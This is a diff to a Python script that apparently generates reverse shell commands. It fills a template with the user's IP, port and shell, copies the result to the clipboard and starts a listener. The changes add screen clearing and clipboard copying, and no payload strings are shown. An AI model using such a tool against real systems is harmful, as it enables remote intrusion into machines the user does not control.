@@ -3,21 +3,29 @@
 import json
 import os
 import random
+import pyperclip
 
 def main():
+    os.system("clear")
     command = get_rev_shell()
     print(20*"-")
+    os.system("clear")
     lhost = get_my_ip()
+    os.system("clear")
     print(20*"-")
     lport = input(f'[+] Choose a port: ')
     print(20*"-")
+    os.system("clear")
     shell = get_shell()
+    os.system("clear")
     print(20*"-")
     command = command.replace("{ip}", lhost)
     command = command.replace("{port}", lport)
     command = command.replace("{shell}", shell)
+    pyperclip.copy(command)
     print(command)
     print(20*"-")
+    print("[*] Command copied to clipboard.")
     start_listener(lport)
 
 def start_listener(lport: str):
@@ -51,6 +59,7 @@ def rev_shell_type():
         print(f'[{c}] {op}')
         c += 1
     option = int(input("[+] Choose OS: "))-1
+    os.system("clear")
     return opsys[option]
 
 def get_my_ip():    
